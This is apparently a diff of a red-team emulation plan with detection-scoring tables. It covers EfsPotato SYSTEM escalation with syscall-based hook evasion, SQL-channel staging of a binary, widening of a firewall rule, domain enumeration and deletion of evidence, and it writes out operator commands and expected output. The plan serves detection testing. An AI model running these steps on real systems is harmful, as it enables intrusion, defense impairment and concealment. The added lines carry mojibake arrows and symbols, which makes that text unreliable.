+| CertEnrollSvc.exe EfsPotato named-pipe impersonation: creates attacker pipe â†’ coerces LSASS via EfsRpcEncryptFileSrv â†’ captures and duplicates SYSTEM token | Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` (running as `NT SERVICE\MSSQL$SQLEXPRESS`) creates a named pipe with GUID-format name (`\\.\pipe\{guid}`) and subsequently calls `NtOpenThreadToken` + `NtDuplicateToken` - named pipe impersonation sequence by a non-SYSTEM service binary in `C:\ProgramData\` on IIS01, detectable via file I/O pipe-creation event and native API monitoring kernel callbacks | Calibrated - Not Benign | - | `CertEnrollSvc.exe` executes the full EfsPotato chain: **(1)** creates a named pipe at `\\.\pipe\{guid}` (file I/O telemetry - pipe creation by a non-SYSTEM service process); **(2)** issues `EfsRpcEncryptFileSrv` RPC call targeting the `lsarpc` named pipe to force LSASS to connect to the attacker pipe (RPC/ETW telemetry - EFSSVC must be running); **(3)** calls `FSCTL_PIPE_IMPERSONATE` on the pipe handle, retrieves the SYSTEM impersonation token via `NtOpenThreadToken`, and duplicates it to a primary token via `NtDuplicateToken` (native API monitoring - kernel callback for token duplication sequence) | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
+| CertEnrollSvc.exe executes FSCTL_PIPE_IMPERSONATE, NtOpenThreadToken, NtDuplicateToken via indirect syscall trampolines bypassing advapi32 hook entry points on IIS01 | Stealth | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` on IIS01 issues `NtFsControlFile` (FSCTL_PIPE_IMPERSONATE code), `NtOpenThreadToken`, and `NtDuplicateToken` via syscall stubs executing from a private EXECUTE_READ (no-file-backing) memory allocation - native API monitoring (kernel callback) observes the syscall return address pointing into the MEM_PRIVATE region rather than `ntdll.dll`, indicating direct-syscall dispatch; `advapi32.dll` hook entry points (`ImpersonateNamedPipeClient`, `DuplicateTokenEx`) are not invoked | Calibrated - Not Benign | - | Token capture and duplication chain executed via VirtualAlloc trampoline page - not advapi32 ImpersonateNamedPipeClient: NtFsControlFile (FSCTL_PIPE_IMPERSONATE) â†’ NtOpenThreadToken â†’ NtDuplicateToken invoked directly via syscall stubs; advapi32 hook intercept points bypassed on x64 | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 | CertEnrollSvc.exe CreateProcessWithTokenW spawns cmd.exe as NT AUTHORITY\SYSTEM | Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `cmd.exe` spawned by `CertEnrollSvc.exe` on IIS01 runs as `NT AUTHORITY\SYSTEM` while parent executes as `NT SERVICE\MSSQL$SQLEXPRESS` - parent/child token privilege mismatch visible in process creation telemetry via `CreateProcessWithTokenW` | Calibrated - Not Benign | - | `CertEnrollSvc.exe` calls `CreateProcessWithTokenW` with the duplicated SYSTEM primary token to spawn `cmd.exe /c whoami /priv > C:\ProgramData\sys_out.txt` as `NT AUTHORITY\SYSTEM` | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 | CertEnrollSvc.exe CreateProcessWithTokenW spawns SYSTEM cmd.exe on IIS01 | Execution | T1106 | Native API | Windows | `CertEnrollSvc.exe` (running as `NT SERVICE\MSSQL$SQLEXPRESS`) invokes the Windows API `CreateProcessWithTokenW` - resolved at runtime via `GetProcAddress` rather than statically imported - to create `cmd.exe` under the duplicated SYSTEM token on IIS01 - native API monitoring (kernel process-creation callback) observes a CreateProcess-family call emitted by a process whose import table does not reference it, and the spawned child runs as `NT AUTHORITY\SYSTEM` while the parent remains a service SID; baseline: no service, tool, or scheduled task on IIS01 creates processes via `CreateProcessWithTokenW` | Calibrated - Not Benign | - | CertEnrollSvc.exe calls CreateProcessWithTokenW (resolved at runtime) to spawn cmd.exe under the duplicated SYSTEM primary token - native process-creation primitive; representative of all EfsPotato SYSTEM spawns in Phase 2 (whoami /priv, cleanup deletions, FwPolicySvc launch) | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 | SYSTEM cmd.exe runs whoami /priv to confirm full privilege token on IIS01 | Discovery | T1033 | System Owner/User Discovery | Windows | `cmd.exe` (running as `NT AUTHORITY\SYSTEM`, child of `CertEnrollSvc.exe`) spawns `whoami.exe` with `/priv` argument on IIS01, redirecting output to `C:\ProgramData\sys_out.txt` - SYSTEM-context privilege enumeration following token theft | Not Calibrated - Not Benign | native-recon | `cmd.exe` running as `NT AUTHORITY\SYSTEM` executes `whoami /priv` and redirects output to `C:\ProgramData\sys_out.txt` - verifies that the duplicated token carries full SYSTEM privileges | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
 | OPENROWSET BULK reads SYSTEM whoami output from C:\ProgramData\sys_out.txt on IIS01 | Collection | T1005 | Data from Local System | Windows | `sqlservr.exe` on IIS01 opens `C:\ProgramData\sys_out.txt` for read access via `OPENROWSET(BULK ... SINGLE_CLOB)` - EDR file-read telemetry: sqlservr.exe reading non-database `.txt` from `C:\ProgramData\` has no baseline on this IIS01 instance; native T-SQL operation, no COM automation or cmd.exe spawn | Calibrated - Not Benign | - | `xpfile cat C:\ProgramData\sys_out.txt` - `OPENROWSET(BULK ... SINGLE_CLOB)` reads entire file as `NVARCHAR(MAX)` in-process within `sqlservr.exe`; output returned as SELECT result to operator via C2 - no cmd.exe spawn on IIS01 | IIS01 (10.12.10.20) | sa | - | - |
-| CertEnrollSvc.exe SYSTEM escalation deletes sys_out.txt from C:\ProgramData\ on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs a second EfsPotato escalation to obtain SYSTEM token, then `CreateProcessWithTokenW` spawns `cmd.exe /c del /f C:\ProgramData\sys_out.txt` as `NT AUTHORITY\SYSTEM` - same escalation chain as T1134.001/T1134.002 rows but for cleanup; Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\sys_out.txt" lsarpc` - second EfsPotato escalation required because `sys_out.txt` is owned by SYSTEM (`xpfile del` returns `0x800A0046` Permission Denied); CertEnrollSvc.exe obtains SYSTEM token → `cmd.exe /c del /f` as SYSTEM | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
+| CertEnrollSvc.exe SYSTEM escalation deletes sys_out.txt from C:\ProgramData\ on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs a second EfsPotato escalation to obtain SYSTEM token, then `CreateProcessWithTokenW` spawns `cmd.exe /c del /f C:\ProgramData\sys_out.txt` as `NT AUTHORITY\SYSTEM` - same escalation chain as T1134.001/T1134.002 rows but for cleanup; Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\sys_out.txt" lsarpc` - second EfsPotato escalation required because `sys_out.txt` is owned by SYSTEM (`xpfile del` returns `0x800A0046` Permission Denied); CertEnrollSvc.exe obtains SYSTEM token â†’ `cmd.exe /c del /f` as SYSTEM | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 
 ---
 
@@ -415,8 +442,8 @@ With SYSTEM confirmed on IIS01 and the xpagent channel operational, the adversar
 
 | Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
 | - | - | - | - | - | - | - | - | - | - | - | - | - |
-| agent_worker activation proc invokes xp_cmdshell running net group /domain on IIS01 | Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | `net.exe group /domain` executed as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 via process chain `sqlservr.exe → cmd.exe → net.exe` - the MSSQL service account has no baseline for issuing domain group discovery commands via SAM-R to the domain controller | Calibrated - Not Benign | - | IIS01 `agent_worker` procedure calls `xp_cmdshell 'net group /domain'`; `sqlservr.exe` spawns `cmd.exe` → `net.exe` as `NT SERVICE\MSSQL$SQLEXPRESS`; `IIS01$` machine account authenticates to DC via SAM-R; output rows returned inline via xpagent poll | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | - | - |
-| agent_worker activation proc invokes xp_cmdshell running net user /domain on IIS01 | Discovery | T1087.002 | Account Discovery: Domain Account | Windows | `net.exe user /domain` executed as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 via process chain `sqlservr.exe → cmd.exe → net.exe` - the MSSQL service account has no baseline for domain user enumeration via SAM-R to the domain controller | Calibrated - Not Benign | - | IIS01 `agent_worker` calls `xp_cmdshell 'net user /domain'`; `net.exe` enumerates all domain user accounts via SAM-R to DC as `IIS01$` | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | - | - |
+| agent_worker activation proc invokes xp_cmdshell running net group /domain on IIS01 | Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | `net.exe group /domain` executed as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 via process chain `sqlservr.exe â†’ cmd.exe â†’ net.exe` - the MSSQL service account has no baseline for issuing domain group discovery commands via SAM-R to the domain controller | Calibrated - Not Benign | - | IIS01 `agent_worker` procedure calls `xp_cmdshell 'net group /domain'`; `sqlservr.exe` spawns `cmd.exe` â†’ `net.exe` as `NT SERVICE\MSSQL$SQLEXPRESS`; `IIS01$` machine account authenticates to DC via SAM-R; output rows returned inline via xpagent poll | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | - | - |
+| agent_worker activation proc invokes xp_cmdshell running net user /domain on IIS01 | Discovery | T1087.002 | Account Discovery: Domain Account | Windows | `net.exe user /domain` executed as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 via process chain `sqlservr.exe â†’ cmd.exe â†’ net.exe` - the MSSQL service account has no baseline for domain user enumeration via SAM-R to the domain controller | Calibrated - Not Benign | - | IIS01 `agent_worker` calls `xp_cmdshell 'net user /domain'`; `net.exe` enumerates all domain user accounts via SAM-R to DC as `IIS01$` | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | - | - |
 
 ---
 
@@ -430,7 +457,7 @@ With SYSTEM confirmed on IIS01 and the domain structure mapped, the adversary mo
 
 **A - Stage FwPolicySvc.exe to IIS01 via MSSQL database channel**
 
-1. ☣️ Stage `FwPolicySvc.exe` to IIS01 via the DB channel (no HTTP from IIS01):
+1. â˜£ï¸ Stage `FwPolicySvc.exe` to IIS01 via the DB channel (no HTTP from IIS01):
 
    ```
    xpstage-hex FwPolicySvc.exe
@@ -440,12 +467,12 @@ With SYSTEM confirmed on IIS01 and the domain structure mapped, the adversary mo
    - controlServer hex-encodes `FwPolicySvc.exe`, generates INSERT SQL file with hex NVARCHAR rows
    - SQL file transferred to `C:\Windows\Temp\` on WS01 via TONESHELL FILE_DOWNLOAD
    - WS01 runs `sqlcmd -i` to bulk-INSERT hex chunks into `tempdb..stg` on IIS01
-   - T-SQL batch on IIS01: concatenates hex rows + `CONVERT(VARBINARY(MAX), @hex, 2)` → `sp_OA ADODB.Stream SaveToFile` writes `FwPolicySvc.exe` to `C:\ProgramData\` - entirely in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` spawn on IIS01
+   - T-SQL batch on IIS01: concatenates hex rows + `CONVERT(VARBINARY(MAX), @hex, 2)` â†’ `sp_OA ADODB.Stream SaveToFile` writes `FwPolicySvc.exe` to `C:\ProgramData\` - entirely in-process within `sqlservr.exe`, no PowerShell or `cmd.exe` spawn on IIS01
    - SQL file deleted from WS01; `tempdb..stg` dropped
 
    - ***Expected Output***
      ```text
-     [+] xpstage-hex done → C:\ProgramData\FwPolicySvc.exe
+     [+] xpstage-hex done â†’ C:\ProgramData\FwPolicySvc.exe
      ```
 
 2. Verify the binary landed on IIS01:
@@ -463,7 +490,7 @@ With SYSTEM confirmed on IIS01 and the domain structure mapped, the adversary mo
 
 **B - Widen the MSSQL rule to all firewall profiles as SYSTEM**
 
-3. ☣️ Execute `FwPolicySvc.exe setprofiles` as SYSTEM through the EFS named-pipe chain, redirecting its output to a staging file for readback (output of the SYSTEM child is not returned inline):
+3. â˜£ï¸ Execute `FwPolicySvc.exe setprofiles` as SYSTEM through the EFS named-pipe chain, redirecting its output to a staging file for readback (output of the SYSTEM child is not returned inline):
 
    ```
    xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe setprofiles \"SQL Server (TCP 1433)\" all > C:\ProgramData\fwp_out.txt 2>&1" lsarpc
@@ -487,11 +514,11 @@ With SYSTEM confirmed on IIS01 and the domain structure mapped, the adversary mo
    > ```
    > xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe show \"SQL Server (TCP 1433)\" >> C:\ProgramData\fwp_out.txt 2>&1" lsarpc
    > ```
-   > → `profiles=all (0x7FFFFFFF)`
+   > â†’ `profiles=all (0x7FFFFFFF)`
 
 **C - Cleanup**
 
-5. ☣️ Delete the output file and the tool (both owned by NT AUTHORITY\SYSTEM):
+5. â˜£ï¸ Delete the output file and the tool (both owned by NT AUTHORITY\SYSTEM):
 
    ```
    xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe" lsarpc
@@ -508,12 +535,12 @@ With SYSTEM confirmed on IIS01 and the domain structure mapped, the adversary mo
 
 ### Reference Tables
 
-<!-- xpstage-hex mechanism behaviors (TONESHELL FILE_DOWNLOAD → sqlcmd INSERT hex → T-SQL ADODB.Stream decode → cleanup) are identical to Step 4 and are not re-scored here. -->
+<!-- xpstage-hex mechanism behaviors (TONESHELL FILE_DOWNLOAD â†’ sqlcmd INSERT hex â†’ T-SQL ADODB.Stream decode â†’ cleanup) are identical to Step 4 and are not re-scored here. -->
 
 | Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
 | - | - | - | - | - | - | - | - | - | - | - | - | - |
 | FwPolicySvc.exe late-bound COM instantiation of HNetCfg.FwPolicy2 on IIS01 | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `FwPolicySvc.exe` (unsigned PE executed from `C:\ProgramData\` as `NT AUTHORITY\SYSTEM`) loads `FirewallAPI.dll` and instantiates the Windows Firewall policy COM object `HNetCfg.FwPolicy2` via late-bound `IDispatch` in-process on IIS01 - module-load telemetry shows `FirewallAPI.dll` mapped into a non-Microsoft process image and in-process COM activation of the firewall policy object; baseline: only OS and Defender components load `FirewallAPI.dll` on IIS01, and no signed or vendor tool performs late-bound COM activation of the firewall policy object from a user-writable path | Calibrated - Not Benign | - | FwPolicySvc.exe (running as NT AUTHORITY\SYSTEM) instantiates HNetCfg.FwPolicy2 via late-bound COM (IDispatch), loading FirewallAPI.dll into its process to reach INetFwPolicy2/INetFwRules - in-process COM activation, no netsh.exe or cmdlet | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [FwPolicySvc.exe](../resources/payloads/defense-impair/FwPolicySvc/) | - |
 | FwPolicySvc.exe sets INetFwRule.Profiles to ALL_PROFILES (0x7FFFFFFF) on the SQL Server (TCP 1433) rule in the Windows Defender Firewall policy store on IIS01 | Defense Impairment | T1686.003 | Disable or Modify System Firewall: Windows Host Firewall | Windows | `FwPolicySvc.exe` (unsigned PE run from `C:\ProgramData\` as `NT AUTHORITY\SYSTEM`) rewrites the `Profiles` mask of the `SQL Server (TCP 1433)` inbound rule on IIS01 from Domain-only to `0x7FFFFFFF` (Domain+Private+Public) - the policy store value under `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules` flips profile scope with no `netsh.exe`, `powershell.exe`, or firewall cmdlet in the process tree | Calibrated - Not Benign | - | `FwPolicySvc.exe` (running as `NT AUTHORITY\SYSTEM`) instantiates `HNetCfg.FwPolicy2` via late-bound COM, resolves the `SQL Server (TCP 1433)` rule through `INetFwRules.Item`, and sets `INetFwRule.Profiles` to `0x7FFFFFFF` - widening the rule from Domain-only to Domain+Private+Public; no `netsh.exe`, no `powershell.exe`, no firewall cmdlet on any command line | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [FwPolicySvc.exe](../resources/payloads/defense-impair/FwPolicySvc/) | - |
-| CertEnrollSvc.exe SYSTEM escalation deletes fwp_out.txt and FwPolicySvc.exe from C:\ProgramData\ on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs a second EfsPotato escalation to obtain SYSTEM token, then `CreateProcessWithTokenW` spawns `cmd.exe /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe` as `NT AUTHORITY\SYSTEM` - same escalation chain as the Step 4 cleanup row but deleting the tool and its output; Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe" lsarpc` - second EfsPotato escalation required because both files are owned by SYSTEM (`xpfile del` returns `0x800A0046` Permission Denied); CertEnrollSvc.exe obtains SYSTEM token → `cmd.exe /c del /f` as SYSTEM | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
+| CertEnrollSvc.exe SYSTEM escalation deletes fwp_out.txt and FwPolicySvc.exe from C:\ProgramData\ on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs a second EfsPotato escalation to obtain SYSTEM token, then `CreateProcessWithTokenW` spawns `cmd.exe /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe` as `NT AUTHORITY\SYSTEM` - same escalation chain as the Step 4 cleanup row but deleting the tool and its output; Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\FwPolicySvc.exe" lsarpc` - second EfsPotato escalation required because both files are owned by SYSTEM (`xpfile del` returns `0x800A0046` Permission Denied); CertEnrollSvc.exe obtains SYSTEM token â†’ `cmd.exe /c del /f` as SYSTEM | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 
 ---
